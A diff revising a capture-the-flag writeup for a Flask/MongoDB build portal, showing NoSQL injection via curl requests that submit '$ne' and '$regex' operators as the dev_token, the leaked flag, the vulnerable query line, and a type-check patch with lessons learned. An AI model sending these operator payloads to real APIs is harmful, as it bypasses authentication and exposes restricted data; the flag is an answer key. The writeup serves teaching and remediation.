@@ -1,74 +1,135 @@
-# Service 9 — Blockstar Build Portal: Writeup
+# Service 9 — Blockstar Build Portal
 
-## 1. Service Number and Name
-**Service 9 — Blockstar Games Internal Build Portal** (NoSQL Injection)
-An internal developer build-distribution portal backed by MongoDB,
-running on port `8009`.
+| | |
+|---|---|
+| **Service** | Service 9 — Blockstar Games Internal Build Portal |
+| **Category** | Web / NoSQL Injection |
+| **Difficulty** | Easy |
+| **Port** | `8009` |
+| **Target** | `<target-ip>:8009` |
+| **Database** | MongoDB |
+| **Author** | `<your-name>` |
 
 ---
 
-## 2. How to Exploit It — Step by Step
+## Synopsis
 
-**Step 1 — Recon the public catalog**
+Blockstar's internal build-distribution portal looks up builds with the
+client-supplied `dev_token` passed directly into a MongoDB query filter.
+Because Flask turns a JSON object into a Python `dict` with no type
+check, a MongoDB query operator (`$ne`, `$regex`, …) can be submitted in
+place of a real token, bypassing the authentication check entirely and
+leaking the flag for the restricted entry.
+
+---
+
+## 1. Enumeration
+
+Start by requesting the public catalog to see what the service exposes.
+
 ```bash
 curl -s http://<target>:8009/api/builds | jq
 ```
-Four titles show full details. One entry has `"classified": true` and a
-hidden name — note its `game_id` (e.g. `gta7`).
 
-**Step 2 — Confirm the obvious attempt fails**
+> 📸 **Screenshot:** terminal output of the `/api/builds` response,
+> showing the public entries and the one `"classified": true` entry
+> with its hidden name.
+
+Four titles return full details. One entry is `classified` and has no
+visible name — note its `game_id` (e.g. `gta7`). This is the target.
+
+> 📸 **Screenshot:** browser view of the portal homepage
+> (`http://<target>:8009/`) with the catalog cards rendered, the
+> restricted card highlighted.
+
+---
+
+## 2. Foothold / Exploitation
+
+**Step 1 — Confirm the obvious approach fails.**
+
 ```bash
 curl -s -X POST http://<target>:8009/api/download_build \
   -H "Content-Type: application/json" \
   -d '{"game_id": "gta7", "dev_token": "guess-a-token"}'
 ```
-→ `404 No build found`. The real token is a random 64-character string — not guessable.
 
-**Step 3 — Send a MongoDB operator instead of a string**
+```
+{"status":"error","message":"No build found for that game ID / dev token combination."}
+```
+
+> 📸 **Screenshot:** terminal showing the `404` / "No build found"
+> response for the guessed token.
+
+A real token is a random 64-character hex string, so guessing or
+brute-forcing it is not practical.
+
+**Step 2 — Send a MongoDB operator instead of a string.**
+
 ```bash
 curl -s -X POST http://<target>:8009/api/download_build \
   -H "Content-Type: application/json" \
   -d '{"game_id": "gta7", "dev_token": {"$ne": ""}}'
 ```
+
 **Result:**
+
 ```json
-{"status":"success","message":"Build access granted.","game":"Grand Theft Aunty VII","build":"UNRELEASED / INTERNAL-ONLY","download_url":"https://cdn.blockstar-internal.local/builds/gta7/package.zip?sig=...","flag":"HS{blockstar_nosql_unreleased_asset_leaked}"}
+{
+  "status": "success",
+  "message": "Build access granted.",
+  "game": "Grand Theft Aunty VII",
+  "build": "UNRELEASED / INTERNAL-ONLY",
+  "download_url": "https://cdn.blockstar-internal.local/builds/gta7/package.zip?sig=...",
+  "flag": "HS{blockstar_nosql_unreleased_asset_leaked}"
+}
 ```
 
-**Step 3b — Equivalent payload (if `$ne` is ever blocked specifically)**
+> 📸 **Screenshot:** terminal showing the successful injected request
+> and the JSON response with the `flag` field visible (redact or crop
+> the flag if this writeup will be shared before the event retires).
+
+**Step 2b — Equivalent payload**, useful if `$ne` is specifically
+blocked:
+
 ```bash
 curl -s -X POST http://<target>:8009/api/download_build \
   -H "Content-Type: application/json" \
   -d '{"game_id": "gta7", "dev_token": {"$regex": "^.*"}}'
 ```
 
+> 📸 **Screenshot:** terminal showing the `$regex` variant also
+> succeeding (optional — include only if you tested it).
+
 ---
 
 ## 3. Why the Service Is Exploitable
 
 When Flask parses a JSON request body with `request.get_json()`, each
-field becomes whatever Python type the JSON represented: a quoted string
-becomes a Python `str`, but a `{ ... }` becomes a Python `dict`. Nothing
-in a normal Flask route stops a client from sending an object where a
+field becomes whatever Python type the JSON represented: a quoted
+string becomes a `str`, but a `{ ... }` becomes a `dict`. Nothing in a
+normal Flask route stops a client from sending an object where a
 string was expected.
 
 The vulnerable line:
+
 ```python
 record = builds.find_one({"game_id": game_id, "dev_token": dev_token})
 ```
+
 passes `dev_token` into the MongoDB query filter exactly as received —
-string or not. MongoDB's query language treats a dict with a `$`-prefixed
-key as an **operator**, not a value to compare against:
-- `{"$ne": ""}` means "not equal to the empty string" — true for every
+string or not. MongoDB's query language treats a dict with a
+`$`-prefixed key as an **operator**, not a value to compare against:
+
+- `{"$ne": ""}` → "not equal to the empty string" — true for every
   real document.
-- `{"$regex": "^.*"}` means "matches this pattern" — also true for
+- `{"$regex": "^.*"}` → "matches this pattern" — also true for
   everything.
 
 So instead of comparing `dev_token` for equality against the stored
-value (`"abc123..." == "abc123..."`), the attacker gets MongoDB to
-answer a completely different question ("does *any* token exist here?")
-— and the real 64-character secret never needs to be known, guessed, or
-brute-forced.
+value, the attacker gets MongoDB to answer a different question
+entirely ("does *any* token exist here?") — the real 64-character
+secret is never known, guessed, or brute-forced.
 
 This is the NoSQL sibling of classic SQL injection: **untrusted input
 reaching a query engine without being constrained to the shape the
@@ -76,7 +137,7 @@ developer assumed it would always have.**
 
 ---
 
-## 4. How to Patch It
+## 4. Remediation / Patch
 
 **File:** `app.py`
 **Function:** `download_build()` (`POST /api/download_build`)
@@ -85,7 +146,6 @@ Add a type check immediately after confirming both fields are present,
 and before the database call:
 
 ```python
-# ... existing code ...
 if game_id is None or dev_token is None:
     return jsonify({
         "status": "error",
@@ -100,25 +160,47 @@ if not isinstance(game_id, str) or not isinstance(dev_token, str):
         "message": "'game_id' and 'dev_token' must be strings.",
     }), 400
 
-try:
-    record = builds.find_one({"game_id": game_id, "dev_token": dev_token})
-# ... existing code ...
+record = builds.find_one({"game_id": game_id, "dev_token": dev_token})
 ```
 
 This rejects any JSON object, array, number, or boolean sent in either
-field — including `{"$ne": ""}` and `{"$regex": "..."}` — before PyMongo
-ever sees them, while leaving genuine string lookups untouched.
+field — including `{"$ne": ""}` and `{"$regex": "..."}` — before
+PyMongo ever sees them, while leaving genuine string lookups
+untouched.
 
-**Verify:**
-1. Re-run Step 3/3b above → should now return `400 'game_id' and 'dev_token' must be strings.`
-2. Confirm legitimate flows still work: a real token for a non-classified
-   build (e.g. `bar1`) should still return `200` with a `download_url`.
+**Verify the patch:**
+
+1. Re-run Step 2/2b above → should now return
+   `400 'game_id' and 'dev_token' must be strings.`
+
+   > 📸 **Screenshot:** terminal showing the `400` response after the
+   > patch is applied.
+
+2. Confirm legitimate flows still work — a real token for a
+   non-classified build (e.g. `bar1`) should still return `200` with a
+   `download_url`.
+
+   > 📸 **Screenshot:** terminal showing a normal, successful request
+   > with a real string token after the patch.
 
 ---
 
-## 5. What You Learn
+## 5. Lessons Learned
 
-- **Validate the *type*, not just the presence, of user input.** Checking that a field exists (`is not None`) is not the same as checking that it's the type your code assumes — a request with no `dev_token` key and a request with `dev_token: {}` both "pass" an existence check but behave very differently downstream.
-- **Any query language — SQL, NoSQL, LDAP, shell — is dangerous once untrusted data reaches it unconstrained.** NoSQL databases aren't immune to injection just because they don't use SQL syntax; MongoDB's operator-as-dict design means a JSON API is *inherently* injection-prone unless input types are enforced.
-- **"It's just JSON" isn't a safety guarantee.** JSON's flexibility (strings, numbers, objects, arrays all valid in the same field) is exactly what makes this attack possible — the wire format accepting more shapes than your code logically expects is the vulnerability.
-- **Fix at the boundary, not deep in the logic.** The patch doesn't touch MongoDB, the query, or any business logic — it rejects malformed input the moment it enters the system, which is both the simplest and most robust place to enforce an invariant.
+- **Validate the *type*, not just the presence, of user input.**
+  Checking a field exists (`is not None`) is not the same as checking
+  it's the type your code assumes — a missing `dev_token` and a
+  `dev_token: {}` both "pass" an existence check but behave very
+  differently downstream.
+- **Any query language — SQL, NoSQL, LDAP, shell — is dangerous once
+  untrusted data reaches it unconstrained.** NoSQL databases aren't
+  immune to injection just because they don't use SQL syntax;
+  MongoDB's operator-as-dict design makes a JSON API inherently
+  injection-prone unless input types are enforced.
+- **"It's just JSON" is not a safety guarantee.** JSON's flexibility
+  (strings, numbers, objects, arrays all valid in the same field) is
+  exactly what makes this attack possible.
+- **Fix at the boundary, not deep in the logic.** The patch doesn't
+  touch MongoDB, the query, or any business logic — it rejects
+  malformed input the moment it enters the system, which is both the
+  simplest and most robust place to enforce an invariant.
